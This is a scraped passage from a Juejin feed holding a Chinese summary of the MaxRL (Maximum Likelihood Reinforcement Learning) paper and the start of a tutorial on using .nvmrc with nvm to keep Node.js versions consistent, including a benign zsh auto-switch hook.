                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在大模型时代，从代码生成到数学推理，再到自主规划的 Agent 系统，强化学习几乎成了「最后一公里」的标准配置。</p>
<p>直觉上，开发者真正想要的其实很简单：让模型更有可能生成「正确轨迹」。从概率角度看，这等价于最大化正确输出的概率，也就是经典的最大似然（Maximum Likelihood）目标。</p>
<p>然而，一项来自 CMU、清华大学、浙江大学等研究机构的最新工作指出了一个颇具颠覆性的事实：</p>
<p>现实中广泛使用的强化学习，并没有真正在做最大似然优化。严格的理论分析显示，强化学习只是在优化最大似然目标的一阶近似 —— 距离我们以为的最优训练目标，其实还差得很远。</p>
<p>正是基于这一观察，研究团队对强化学习的目标函数进行了重新审视，提出了最大似然强化学习（Maximum Likelihood Reinforcement Learning）：将基于正确性的强化学习重新刻画为一个潜变量生成的最大似然问题，进一步引入一族以计算量为索引的目标函数，使训练目标能够逐步逼近真正的最大似然优化。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cadc752b68a64997910e006f2fd7a8aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=%2F1DlYNvQCgEzdOjtGxgyI85ywxQ%3D" alt="图片" loading="lazy"/></p>
<ul>
<li>论文标题：Maximum Likelihood Reinforcement Learning</li>
</ul>

<ul>
<li>论文链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2602.02710" target="_blank" title="https://arxiv.org/abs/2602.02710" ref="nofollow noopener noreferrer">arxiv.org/abs/2602.02…</a></li>
<li>项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fzanette-labs.github.io%2FMaxRL%2F" target="_blank" title="https://zanette-labs.github.io/MaxRL/" ref="nofollow noopener noreferrer">zanette-labs.github.io/MaxRL/</a></li>
</ul>

<ul>
<li>Github 地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftajwarfahim%2Fmaxrl" target="_blank" title="https://github.com/tajwarfahim/maxrl" ref="nofollow noopener noreferrer">github.com/tajwarfahim…</a></li>
</ul>
<p>传统强化学习的「卡脖子」问题</p>
<p>在代码生成、数学推理、多步决策这些任务中，我们已经形成了一种几乎默认的共识：只要反馈是二值的、过程是不可微的，就用强化学习。</p>
<p>强化学习这套范式，支撑了从 AlphaGo 到大语言模型推理能力提升的一系列关键进展。</p>
<p>从端到端的角度看，强化学习就是给定一个输入，模型隐式地诱导出一个「成功概率」. 如果不考虑可微性约束，最自然、也最原则性的目标，就是最大似然。</p>
<p>但论文研究团队发现：基于期望奖励的强化学习，其实只是在优化最大似然目标的一阶近似。更具体地说，最大似然目标在总体层面可以展开为一系列以 pass@k 事件为基的项，而标准强化学习只优化了其中的一阶项。</p>
<p>简单来说，强化学习并没有真正最大化「模型生成正确答案的概率」，而是在优化一个与真实似然存在系统性偏差的替代目标。</p>
<p>这也解释了一个广泛存在却难以言说的现象：强化学习早期进展迅速，但越到后期，性能提升越困难。</p>
<p>研究团队针对这一新发现，对「基于正确性反馈的强化学习」进行了重新刻画，论文的主要贡献如下：</p>
<ul>
<li>
<p>将基于正确性的强化学习形式化为一个潜变量生成的最大似然问题，并证明标准强化学习仅优化了最大似然目标的一阶近似。</p>
</li>
<li>
<p>提出了一族以计算量为索引的目标函数，通过对 pass@k 事件进行 Maclaurin 展开，在期望回报与精确最大似然之间实现连续插值。</p>
</li>
<li>
<p>推导出一种简单的 on-policy 估计器，其期望梯度与该计算量索引的似然近似目标完全一致，这意味着增加采样真正改善了被优化的目标本身。</p>
</li>
</ul>
<p>最大似然：真正改进优化目标</p>
<p>研究团队认为，最大似然估计在有监督学习中表现卓越，为什么不直接在强化学习中实现它？</p>
<p>上一节中的观察启示我们：可以构造一个随计算量变化的目标函数族，逐步引入更高阶项；随着可用计算资源的增加，该目标函数族将逐渐收敛到完整的最大似然目标。</p>
<p>论文通过一系列推导，将最大似然目标在失败事件方面进行麦克劳林展开：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15027dfab74c467cac185924ae21de27~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=lAGOOmUFD8QA5F%2FRj42aR5qxS5E%3D" alt="图片" loading="lazy"/></p>
<p>展开式中的最大似然梯度很难用有限样本进行估计。</p>
<p>特别是，估计大 k 值的 pass@k 梯度需要越来越多的样本，尤其是在通过率 p 很小的情况下。这种有限样本的困难正是提出最大似然强化学习（MaxRL）的动机所在。</p>
<p>研究团队将 MaxRL 定义为一类强化学习方法，它们显式地以最大似然为目标，而不是以通过率为目标，同时在有限采样和不可微生成的条件下仍然可实现。下面我们考虑一种实现该目标的原则性方法。</p>
<p>考虑通过将麦克劳林展开式截断为有限阶来近似最大似然目标，然后估计该目标。对于截断级别 T ∈N，我们将固定输入 x 的截断最大似然目标定义为：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e8ca76c3e1d4db5bdfbfbd82f61d074~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=pBlEMp4SQ%2FpWa46MRp2VY8wgquk%3D" alt="图片" loading="lazy"/></p>
<p>对其求导得到截断的总体梯度：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ea431e17eb243179a0bd55880585190~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=O3kyfBpNpRJ7QHeutjdMaIu2MK8%3D" alt="图片" loading="lazy"/></p>
<p>这定义了一族目标函数：T = 1 还原为强化学习，T → ∞ 还原为最大似然，中间的 T 值则在两者之间插值。因此，截断级别 T 直接控制了有助于学习的正确性事件的阶数。随着在 rollout 方面消耗更多的计算量，对更高阶梯度的估计变得可行。</p>
<p>换句话说： MaxRL 提供了一个原则性框架，用于通过增加计算量来换取对最大似然目标更高保真度的近似。</p>
<p>上述公式已经给出了一种可行的无偏估计思路：利用 pass@k 梯度估计器，对有限级数中的每一项分别进行近似。在这一策略下，任何对 pass@k 估计器的改进，都会直接转化为对截断最大似然目标的更优梯度估计。</p>
<p>不过，在本篇论文中，研究者采取了一条不同的路径，将带来更为简洁的估计器形式，同时也提供了一个新的理解视角。</p>
<p>最大似然目标的梯度可以写成如下的条件期望形式：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/891a414064c147ccbbb4f59745c8a76e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=6MKa78EYG9VNMG1pPjbRnuCtC38%3D" alt="图片" loading="lazy"/></p>
<p>该定理表明，最大似然梯度等价于仅对成功轨迹的梯度进行平均。这一解释为构造具体的梯度估计器提供了直接途径：只需用采样得到的成功轨迹，对上述条件期望进行样本平均即可。</p>
<p>其核心洞见在于：最大似然目标的梯度可以表示为在「成功条件分布」下的期望。</p>
<p>因此，本文采用了一种简单的策略：从非条件化的策略分布进行采样，但只对成功轨迹进行平均，得到了强化学习风格的估计器，其具备随着 rollout 数的增加，对最大似然梯度的近似将不断改善的特性。</p>
<p>换言之，在 MaxRL 框架下，额外的计算资源不仅改善了估计质量，更直接改进了被优化的目标本身。</p>
<p>令人惊讶的效率进步</p>
<p>在实验中，这一改变带来了远超预期的收益。研究团队在多个模型规模和多类任务上，对 MaxRL 进行了系统评估，结果显示：MaxRL 在性能与计算效率的权衡上均稳定地优于现有强化学习方法。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e654863de0054d30b11e8b752b25d53b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=2%2FPgs0gUTQA9SihYm4r%2BRFrHuvs%3D" alt="图片" loading="lazy"/></p>
<p>实验结果直观展示了 MaxRL 在训练效率上的优势。在相同训练步数下，MaxRL 性能提升明显更快，并且随着 rollout 数的增加，MaxRL 持续受益。</p>
<p>这种优势并不只体现在训练阶段，相较于使用 GRPO 训练的模型，MaxRL 测试时的 scaling 效率最高可提升 20 倍。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7c6251271f446c79fc748b61100747b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=2kEMNzyFsM4Gq7qP9n5mhh7D9wU%3D" alt="图片" loading="lazy"/></p>
<p>在迷宫任务上，无论测试时的采样预算 k 取何值，随着训练 rollouts 的增加，MaxRL 都能持续降低 −log (Pass@k)，而 GRPO 与 RLOO 的改进幅度则明显更早趋于平缓。这一结果直观地展示了 MaxRL 在训练阶段更优的性能–效率权衡。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78e0726f198541208b8013af80023669~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=z%2FHhlPeQrjkthjUed7usK3hKqFY%3D" alt="图片" loading="lazy"/></p>
<p>比较在不同 pass@k 设置下各方法随训练中采样计算增加时的优化趋势，可以看到，对于 GRPO 与 RLOO，曲线在早期下降后迅速变平，说明额外采样主要用于降低噪声；而 MaxRL 在不同 k 值下均保持持续下降，推动模型不断逼近一个更接近最大似然的优化目标。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/812a03f07a8644b3bc48061da1e9617a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=JlbK%2FwQWrwggYpWo%2FdDB84YH9NM%3D" alt="图片" loading="lazy"/></p>
<p>在更大规模设置下，MaxRL 的优势依然保持稳定。这表明，MaxRL 所带来的改进并非依赖于特定规模或超参数设置，当训练规模扩大时，MaxRL 并未出现收益递减过快或优势消失的现象。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc6b1c5ccece407c938dcb99cc72054a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=2cfyUBmpKhiyFaog8x%2B%2B5ofgGS8%3D" alt="图片" loading="lazy"/></p>
<p>进一步的实验结果表明，MaxRL 的优势并不依赖于过于理想化的实验条件，即使在反馈存在噪声或验证信号并非完全可靠的设置下，MaxRL 仍然能够保持相对稳定的性能优势。</p>
<p>总体来看，MaxRL 为不可微、基于采样的学习问题提供了一种更为深入的解法。它通过一个随计算量自然扩展的目标框架，系统性地逼近真正的似然优化。</p>
<p>当优化目标本身可以随算力演进、逐步逼近最大似然，强化学习究竟会成为通往通用智能的长期答案，还是只是通往下一个训练范式的过渡方案？</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[《告别“我电脑上好好的”：.nvmrc 让 Node.js 版本管理变轻松》]]></title>    <link>https://juejin.cn/post/7603160727717953587</link>    <guid>https://juejin.cn/post/7603160727717953587</guid>    <pubDate>2026-02-05T09:39:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603160727717953587" data-draft-id="7603185231801483290" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="《告别“我电脑上好好的”：.nvmrc 让 Node.js 版本管理变轻松》"/> <meta itemprop="keywords" content="前端,Node.js"/> <meta itemprop="datePublished" content="2026-02-05T09:39:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="leafyyuki"/> <meta itemprop="url" content="https://juejin.cn/user/2172290706728829"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            《告别“我电脑上好好的”：.nvmrc 让 Node.js 版本管理变轻松》
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2172290706728829/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    leafyyuki
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:39:47.000Z" title="Thu Feb 05 2026 09:39:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    17
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在团队协作开发 Node.js 项目时，你是否经常遇到这些烦心事？</p>
<ul>
<li>“这个模块在我电脑上运行正常，怎么到你那就报错了？”</li>
<li>“我刚更新了 Node 版本，为什么老项目跑不起来了？”</li>
<li>每切换一个项目，就要查一下它用的 Node 版本，然后手忙脚乱地切换。</li>
</ul>
<p>如果你的答案是“是”，那么  **<code>.nvmrc</code>**​ 文件就是你一直在寻找的“版本一致性”解决方案。配合 Node 版本管理工具 <strong>nvm</strong>，它能帮你彻底告别环境混乱。本文将带你轻松掌握这套最佳实践。</p>
<h3 data-id="heading-0">什么是 nvm 与 .nvmrc？</h3>
<p><strong>nvm (Node Version Manager)</strong> ​ 是一个命令行工具，允许你在同一台机器上安装和切换多个版本的 Node.js。它完美解决了不同项目需要不同 Node 运行环境的难题。</p>
<p>而  **<code>.nvmrc</code>**​ 文件则是一个“版本说明书”。你只需在项目根目录创建这个文件，并在里面写上项目所需的 Node.js 版本号（如 <code>v20.10.0</code>）。此后，任何人或任何工具（包括你的队友、CI/CD 流水线）进入这个项目，都能通过一条简单的命令 <code>nvm use</code>，快速切换到正确的版本。</p>
<h3 data-id="heading-1">快速上手：3步建立版本规范</h3>
<p>整个核心流程可以概括为以下三个步骤：</p>
<pre><code class="hljs language-css" lang="css">flowchart <span class="hljs-selector-tag">TD</span>
    <span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[开始: 使用.nvmrc]</span> --&gt; <span class="hljs-selector-tag">B</span><span class="hljs-selector-attr">[在项目根目录创建.nvmrc文件]</span>
    <span class="hljs-selector-tag">B</span> --&gt; C<span class="hljs-selector-attr">[在文件中写入Node.js版本号]</span>
    C --&gt; D<span class="hljs-selector-attr">[在终端执行nvm use]</span>
    D --&gt; E{版本是否已安装?}
    E -- 是 --&gt; F<span class="hljs-selector-attr">[成功切换到指定版本]</span>
    E -- 否 --&gt; G<span class="hljs-selector-attr">[自动安装指定版本]</span>
    G --&gt; F
    F --&gt; H<span class="hljs-selector-attr">[在当前目录及其子目录下项目使用指定版本]</span>
</code></pre>
<p><strong>1. 创建 <code>.nvmrc</code>文件</strong></p>
<p>在你的项目根目录下，运行命令创建文件并指定版本。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 指定精确版本（推荐，确保完全一致）</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"v20.10.0"</span> &gt; .nvmrc

<span class="hljs-comment"># 或使用主版本号（将使用20.x.x中的最新版）</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"20"</span> &gt; .nvmrc

<span class="hljs-comment"># 或使用LTS版本（将使用当前的长期支持版）</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"lts/*"</span> &gt; .nvmrc
</code></pre>
<p><strong>2. 使用指定版本</strong></p>
<p>在项目目录下，执行：</p>
<pre><code class="hljs language-perl" lang="perl">nvm <span class="hljs-keyword">use</span>
</code></pre>
<p>nvm 会自动读取 <code>.nvmrc</code>文件并切换版本。如果该版本未安装，nvm 会给出明确的安装提示。</p>
<p><strong>3. 提交到代码仓库</strong></p>
<p>将 <code>.nvmrc</code>文件提交到 Git 等版本控制系统中。这是<strong>团队协作中至关重要的一步</strong>，确保每位开发者都能使用相同的 Node.js 环境。</p>
<h3 data-id="heading-2">进阶技巧：让版本切换“自动化”</h3>
<p>如果你厌倦了每次进入项目都要手动输入 <code>nvm use</code>，可以通过配置 Shell 实现<strong>全自动切换</strong>。</p>
<p>将以下脚本添加到你的 <code>~/.zshrc</code>或 <code>~/.bashrc</code>文件末尾（放在 nvm 初始化语句之后）：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 置于 ~/.zshrc 或 ~/.bashrc 中</span>
<span class="hljs-built_in">autoload</span> -U add-zsh-hook
load-<span class="hljs-function"><span class="hljs-title">nvmrc</span></span>() {
  <span class="hljs-built_in">local</span> nvmrc_path=<span class="hljs-string">"<span class="hljs-subst">$(nvm_find_nvmrc)</span>"</span>
  <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">"<span class="hljs-variable">$nvmrc_path</span>"</span> ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">local</span> nvmrc_node_version=$(nvm version <span class="hljs-string">"<span class="hljs-subst">$(cat <span class="hljs-string">"<span class="hljs-variable">${nvmrc_path}</span>"</span>)</span>"</span>)
    <span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$nvmrc_node_version</span>"</span> = <span class="hljs-string">"N/A"</span> ]; <span class="hljs-keyword">then</span>
      nvm install
    <span class="hljs-keyword">elif</span> [ <span class="hljs-string">"<span class="hljs-variable">$nvmrc_node_version</span>"</span> != <span class="hljs-string">"<span class="hljs-subst">$(nvm version)</span>"</span> ]; <span class="hljs-keyword">then</span>
      nvm use
    <span class="hljs-keyword">fi</span>
  <span class="hljs-keyword">elif</span> [ <span class="hljs-string">"<span class="hljs-subst">$(nvm version)</span>"</span> != <span class="hljs-string">"<span class="hljs-subst">$(nvm version default)</span>"</span> ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"切换回 nvm 默认版本"</span>
    nvm use default
  <span class="hljs-keyword">fi</span>
}
add-zsh-hook chpwd load-nvmrc
load-nvmrc
</code></pre>
<p>保存后执行 <code>source ~/.zshrc</code>。配置完成后，你的终端会在进入项目目录时自动切换 Node 版本，离开时切回默认版本，实现“无感”切换。</p>
<h3 data-id="heading-3">融入开发生命周期</h3>
